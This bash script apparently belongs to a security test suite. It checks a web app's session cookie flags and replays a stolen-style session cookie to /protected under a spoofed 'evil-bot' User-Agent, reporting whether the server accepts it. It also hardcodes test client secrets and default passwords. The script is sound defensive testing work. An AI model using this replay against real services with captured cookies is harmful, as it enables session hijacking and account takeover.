#!/usr/bin/env bash
# A6 — Session Cookie Hijack (cross-User-Agent replay)
# OWASP ASVS v4.2 § 3.4.1–3.4.5 — Verify session cookie security attributes.
# MITRE ATT&CK T1539
#
# Simulates an attacker who obtained a valid session cookie (e.g. via XSS due
# to missing HttpOnly, or network sniffing due to missing Secure flag) and
# replays it from a different User-Agent / IP.
#
# Usage:
#   bash A6_session_hijack.sh <base_url> <session_cookie>
#
# Result:
#   VULNERABLE — /protected returned 200 with stolen cookie (no binding check)
#   PROTECTED  — server rejected cookie due to security flags or binding

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

BASE_URL="${1:?Usage: $0 <base_url> <session_cookie>}"
SESSION="${2:-}"

if [[ -z "$SESSION" ]]; then
  echo "[A6] No session cookie provided — trying automatic login flow..."
  REALM="profile-a-vulnerable"
  CLIENT_SECRET="testpass123"
  if [[ "$BASE_URL" == *"app-a-h."* ]]; then
    REALM="profile-a-hardened"
    CLIENT_SECRET="Str0ngCl!entS3cr3t_changeme"
  fi
  AUTH_JSON=$(cat <<EOF
{"app_url":"$BASE_URL","kc_url":"${KC_A:-http://keycloak.local:8080}","realm":"$REALM","client_id":"sso-test-app","client_secret":"$CLIENT_SECRET","username":"${PROFILE_C_EMAIL:-testuser@example.com}","password":"${PROFILE_C_PASSWORD:-password123}"}
EOF
)
  SESSION=$(python3 "$SCRIPT_DIR/auto_auth.py" sess "$AUTH_JSON" 2>/dev/null || true)
fi

if [[ -z "$SESSION" ]]; then
  echo "[A6] SKIPPED — unable to obtain a valid session cookie automatically"
  exit 0
fi

PROTECTED="${BASE_URL%/}/protected"

echo "[A6] Session cookie hijack"
echo "     Target: $BASE_URL"
echo

# Step 1: check the Set-Cookie header to see what flags are present
HEADERS=$(rcurl -si "${BASE_URL%/}/" | grep -i "set-cookie" || true)
echo "  [1] Set-Cookie headers from /:"
if [[ -n "$HEADERS" ]]; then
  echo "      $HEADERS"
  if echo "$HEADERS" | grep -qi "HttpOnly"; then
    echo "      HttpOnly: PRESENT (JS cannot steal this cookie)"
  else
    echo "      HttpOnly: MISSING ← cookie readable by JavaScript (XSS risk)"
  fi
  if echo "$HEADERS" | grep -qi "Secure"; then
    echo "      Secure:   PRESENT (cookie not sent over HTTP)"
  else
    echo "      Secure:   MISSING ← cookie sent over plain HTTP (sniff risk)"
  fi
  if echo "$HEADERS" | grep -qi "SameSite=Strict\|SameSite=Lax"; then
    echo "      SameSite: PRESENT"
  else
    echo "      SameSite: MISSING ← cross-site request forgery possible"
  fi
else
  echo "      (no Set-Cookie header observed on /)"
fi
echo

# Step 2: replay the stolen session from a different User-Agent
EVIL_UA="Mozilla/5.0 (compatible; evil-bot/1.0)"
STATUS=$(rcurl -s -o /tmp/b3_response.txt -w "%{http_code}" \
  -A "$EVIL_UA" \
  --cookie "sess=$SESSION" \
  "$PROTECTED")

echo "  [2] GET /protected with stolen cookie + evil User-Agent → HTTP $STATUS"
if [[ "$STATUS" == "200" ]]; then
  echo "      Content: $(head -c 200 /tmp/b3_response.txt)"
fi

echo

if [[ "$STATUS" == "200" ]]; then
  echo "VULNERABLE — stolen session accepted from different User-Agent"
  echo "             Cookie flags (HttpOnly/Secure/SameSite) are absent or weak."
else
  echo "PROTECTED  — session rejected (HTTP $STATUS)"
fi
